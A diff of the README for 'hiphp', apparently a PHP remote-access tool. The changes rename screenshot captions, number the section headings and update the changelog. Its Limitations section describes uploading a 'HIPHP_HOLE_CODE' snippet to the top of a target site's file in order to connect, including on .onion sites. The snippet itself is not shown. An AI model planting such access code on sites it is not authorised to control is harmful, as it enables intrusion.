+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot11.png" alt="hiphp-desktop settings">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot12.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot12.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot12.png" alt="hiphp-tk login">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot13.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot13.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot13.png" alt="hiphp-tk">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot15.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot15.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot15.png" alt="hiphp after installed on linux">
     </a>
 </div>
 
 <br>
-<h2>Changelog History:</h2>
+<h2>15- Changelog History:</h2>
 
 <details>
   <summary>Click to See changelog History</summary>
 
 ```
-## 0.2.31.1 [In Progress]
+## 0.2.32 [Last Version]
  - Update template in "hiphp-desktop".
+ - Update documents.
  - Bug fixes & performance improvements.
 
 ## 0.2.31 [27-11-2022][Last Version]
@@ -808,26 +778,21 @@ hiphp Commands :
 </details>
 
 <br>
-<h2>Limitations:</h2>
+<h2>16- Limitations:</h2>
 1. When you use hiphp for the first time on a site, the code HIPHP_HOLE_CODE will show you, copy it and upload it to the path you want to connect to, for example 'https://localhost/inc/example.php'.<br>
 2. In order for hiphp to work well and without errors, HIPHP_HOLE_CODE must be placed at the top of the target file.<br>
 3. hiphp will not work and it will show you a message stating that you are unable to connect to the site if you do not enter the correct path to the location of HIPHP_HOLE_CODE via the link.<br>
 4. If you use hiphp on .onion sites, you must run tor services or tor browser.<br>
-<!--6. I AM NOT RESPONSIBLE HOW YOU USE MY TOOLS/PROGRAMS/PROJECTS. BE LEGAL AND NOT STUPID.-->
-5. If you are a Windows user, you must modify the "config.ini" file or use this command:
-
-```
-python -c "import sys; open('config.ini', 'w+').write('python_default_path='+sys.executable)"
-```
-
+5. If you are a Windows user, you must modify the "config.ini" file.<br>
+6. I AM NOT RESPONSIBLE HOW YOU USE MY TOOLS/PROGRAMS/PROJECTS. BE LEGAL AND NOT STUPID.
 
 <br>
-<h2>Development By:</h2>
+<h2>17- Development By:</h2>
 
 Developer / Author: [yasserbdj96](https://github.com/yasserbdj96)
 
 <br>
-<h2>License:</h2>
+<h2>18- License:</h2>
 
 <p>Copyright © 2008->Present, yasserbdj96 (Boudjada Yasser)
 <br>
@@ -1042,7 +1007,7 @@ The content of this repository is bound by the following license:</p>
 </details>
 
 <br>
-<h2>Support:</h2>
+<h2>19- Support:</h2>
 <p>If you like `hiphp` and want to see it improve furthur or want me to create intresting projects , You can buy me a coffee </p>
 <div align="center">
     <a href="https://ko-fi.com/yasserbdj96">
@@ -1071,30 +1036,3 @@ The content of this repository is bound by the following license:</p>
     <a href="https://ko-fi.com/yasserbdj96">sponsor</a>
   </samp>
 </p>
-
-<br>
-
-<!--h2 align="center">🔥 Visit 🔥</h2>
-
-<p align="center">
-	<a href="http://yasserbdj96.github.io/">
-		<img title="yasserbdj96" src="https://img.shields.io/badge/yasserbdj96-%23E4405F.svg?&style=for-the-badge&logo=web&logoColor=white">
-	</a>
-</p>
-
-<br>
-<div align="center">
-    <img align="center" height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/install/hiphp.png" alt="hiphp by yasserbdj96">
-</div>
-
-<br><br-->
-
-<!--
-
-all posts [`#yasserbdj96`](#yasserbdj96) ,all views my own.
-
-<br><br>
-
-[⬆ Back to Top](#Table-of-contents)
-
--->
